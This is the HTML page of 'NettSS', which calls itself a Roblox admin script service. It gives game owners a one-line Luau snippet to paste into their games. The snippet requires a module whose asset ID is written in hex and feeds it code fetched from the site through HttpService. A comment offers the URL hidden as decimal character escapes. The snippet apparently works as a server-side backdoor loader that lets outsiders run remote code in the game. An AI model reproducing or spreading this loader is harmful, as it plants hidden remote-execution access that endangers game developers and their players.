<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>NettSS</title>
        <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
        <link rel="stylesheet" href="/assets/css/index.css">
        <link rel="stylesheet" media="screen" href="/assets/css/sidebar.css">
        <link rel="stylesheet" media="screen" href="/assets/css/editor.css">
        <link rel="stylesheet" media="screen" href="/assets/css/script.css">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.34.0/ace.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.34.0/ext-language_tools.min.js"></script>
        <meta content="NettSS" property="og:title">
        <meta content="Nett Administration is an open-source admin program for Roblox, offering a wide array of features and commands to improve the experience for both players and developers." property="og:description">
        <meta content="https://nett.wtf/" property="og:url">
        <meta content="#bc49db" data-react-helmet="true" name="theme-color">
    </head>
    <body>
        <div style="text-align: center;">
            <h1 onclick="window.location.href = '/'"><div class="logo_name"><span style="color: #bc49db;">Nett</span><span>SS</span></div></h1>
            <h2 style="margin-bottom: 0;">Admin Script</h2>
            <p>Put this script in your game. Make sure HTTPEnabled is true.</p>
            <p>After that, the game will require manual approval from a Nett administrator to be added to the list!</p>
            <br>
        </div>
        <div id="container" style="width:100%; height:100%;"></div>
        <script src="/assets/vs/loader.js"></script>
        <script defer src="/assets/js/editor.js"></script>
        <script defer>
            function waitForEditor(timeout = 5000) {
                return new Promise((resolve, reject) => {
                    const start = Date.now();
                    (function check() {
                        if (window.editor) return resolve(window.editor);
                        if (Date.now() - start > timeout) return reject(new Error("Editor not loaded in time."));
                        setTimeout(check, 50);
                    })();
                });
            }
            waitForEditor().then(editor => {
                const url = `https://${document.location.hostname}/admin.luau`;
                editor.setValue(`a=0x26E001F12;require(a)(game:GetService("HttpService"):GetAsync("${url}",true))

--[[
    alternatively, use
     "\\${url.split("").map(c => c.charCodeAt(0).toString(10).padStart(3, "0")).join("\\").toUpperCase()}"
    as a url instead of "${url}"
]]`);
                switchReadonly(true);
            }).catch(console.error);
        </script>
    </body>
</html>
